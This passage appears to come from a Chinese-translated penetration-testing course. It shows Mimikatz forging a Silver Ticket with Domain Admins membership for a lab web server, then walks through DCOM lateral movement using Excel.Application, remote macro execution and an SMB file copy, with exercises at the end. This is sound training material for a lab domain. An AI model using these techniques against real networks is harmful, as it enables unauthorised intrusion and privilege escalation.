
Domain  : `corp.com` (CORP)

SID     : `S-1-5-21-1602875587-2787523311-2599479668`

User Id : `500`

Groups Id : `*513 512 520 518 519`

ServiceKey: `e2b475c11da2a0748290d8aa966c327` - `rc4_hmac_nt`

Service : `HTTP`

Target  : `CorpWebServer.corp.com`

Lifetime : `13/02/2018 10.18.42` ; `11/02/2028 10.18.42` ; `11/02/2028 10.18.42`

-> Ticket : **Pass The Ticket**

* PAC generated
* PAC signed
* EncTicketPart generated
* EncTicketPart encrypted
* KrbCred generated

Golden ticket for 'offsec @ corp.com' successfully submitted for current session

`mimikatz # kerberos::list`

```
[00000000] - 0x00000017 - rc4_hmac_nt
```

开始/结束/最大续期次数：`2018-02-13 10:18:42` ; `2028-02-11 10:18:42` ; `2028-02-11 10:18:42`
服务器名称：`HTTP/CorpWebServer.corp.com @ corp.com`
客户端名称：`offsec @ corp.com`
标志 `40a00000` ：pre_authent ; renewable ; forwardable ;

清单 709 - 为 `iis_service` 服务账户创建银票（Silver Ticket）

如清单 709 中的输出所示，针对 SPN `HTTP/CorpWebServer.corp.com` 的新服务票据已加载到内存中，且 Mimikatz 在伪造的票据中设置了相应的组成员权限。从 IIS 应用程序的角度来看，当前用户既是内置的本地管理员（相对标识符：`500`），也是多个高权限组的成员，其中包括 Domain Admins 组（如上所示高亮显示）。

*为了创建银票，我们使用的是密码哈希值，而不是明文密码。如果 kberoast 会话向我们提供了明文密码，我们必须在生成银票之前对其进行哈希处理。*

现在我们已经将该票据加载到内存中，我们可以与该服务进行交互，并根据我们在银票中设置的组成员身份访问任何信息。根据服务类型的不同，也可能获得代码执行权限。

## 21.4.3.1 练习

- 创建并注入 `iis_service` 账户的银票。
- 为 SQL 服务创建一个具有 Domain Admins 组组成员身份的银票，如何提供一种在关联服务器上获得任意代码执行权限的方法？
- 为 SQL 服务账户创建一个银票。

### 21.4.4 分布式组件对象模型

在本节中，我们将更仔细地研究一种相当新的横向移动技术，该技术利用了分布式组件对象模型（DCOM）。^[679]

*还有两种值得一提的其他知名横向移动技术：滥用 Windows 管理工具架构^[680] 以及一种称为 PowerShell 远程的技术。^[681] 虽然我们在本节中不会详细介绍这些方法，但它们也各有优缺点，并且在 PowerShell^[682] 和 Python^[683] 中都有多种实现。*

微软组件对象模型（COM）是一个用于创建相互交互的软件组件的系统。虽然 COM 是为同进程或跨进程交互创建的，但它被扩展为分布式组件对象模型（DCOM），用于通过网络在多台计算机之间进行交互。

COM 和 DCOM 都是非常古老的技术，可以追溯到 Windows 的早期版本。^[684] 与 DCOM 的交互是通过 TCP 端口 `135` 上的 RPC 进行的，并且需要本地管理员权限来调用 DCOM 服务控制管理器，这本质上是一个 API。

与 Microsoft Office 相关的 DCOM 对象允许横向移动，既可以通过使用 Outlook^[685]，也可以通过 PowerPoint。^[686] 由于这要求目标计算机上存在 Microsoft Office，因此这种横向移动技术最适合针对工作站。然而，在我们的案例中，我们将在实验室中针对已安装 Office 的专用域控制器来演示此攻击。具体来说，我们将利用 *Excel.Application* DCOM 对象。^[687]

在我们能够利用 Microsoft Office 之前，我们必须先在 Windows 10 学生虚拟机和域控制器上安装它。安装程序位于 `C:\tools\client_side_attacks\Office2016.img`，过程与客户端攻击模块中执行的过程相同。

首先，我们必须使用 PowerShell 发现该 DCOM 对象的可用方法或子对象。在这个示例中，我们作为 `jeff_admin` 用户从 Windows 10 客户端操作，该用户是远程机器上的本地管理员。

在此示例代码中，我们首先使用 PowerShell 和 `System.Activator` 类的 `CreateInstance` 方法^[688] 创建该对象的一个实例。

作为 `CreateInstance` 的参数，我们必须通过使用 `GetTypeFromProgID` 方法^[689] 提供其类型，指定程序标识符（在本例中为 `Excel.Application`），以及远程工作站的 IP 地址。

一旦实例化了对象，我们可以使用 `Get-Member` cmdlet 来发现其可用方法和对象。^[690]

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
$com | Get-Member
```

清单 710 - 创建 DCOM 对象并枚举方法的代码

该脚本产生以下截断的输出：

```text
TypeName: System.__COMObject#({000208D5-0000-0000-C000-000000000046})
Name MemberType Definition
---- ------------ --------
ActivateMicrosoftApp Method void ActivateMicrosoftApp (XLMSApplication)
AddChartAutoFormat Method void AddChartAutoFormat (Variant, string, Varia
... ... ...
ResetTipWizard Method void ResetTipWizard ()
Run Method Variant Run (Variant...)
Save Method void Save (Variant)
... ... ...
Workbooks Property Workbooks Workbooks () {get}...
```

清单 711 - 显示 Run 方法的输出

输出中包含许多方法和对象，但我们将重点关注 `Run` 方法，^[691] 它允许我们远程执行 Visual Basic for Applications (VBA) 宏。

为了使用它，我们首先通过选择 `VIEW` 选项卡并在 Excel 内点击 `Macros` 来创建一个包含概念验证宏的 Excel 文档。

在这个简单的概念验证中，我们将使用一个启动 `notepad.exe` 的 VBA 宏：

```vb
Sub mymacro()
    Shell ("notepad.exe")
End Sub
```

清单 712 - Excel 的概念验证宏

我们将宏命名为 "mymacro"，并将 Excel 文件保存为遗留的 `.xls` 格式。

为了执行该宏，我们必须先将 Excel 文档复制到远程计算机。由于利用 DCOM 必须具有本地管理员权限，因此我们还应该能够通过 SMB 访问远程文件系统。

我们可以使用 .NET `System.IO.File` 类的 `Copy` 方法^[692] 来复制文件。要调用它，我们需要指定源文件、目标文件以及一个指示如果存在是否应覆盖目标文件的标志，如下面的 PowerShell 代码所示：

```powershell
$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
```
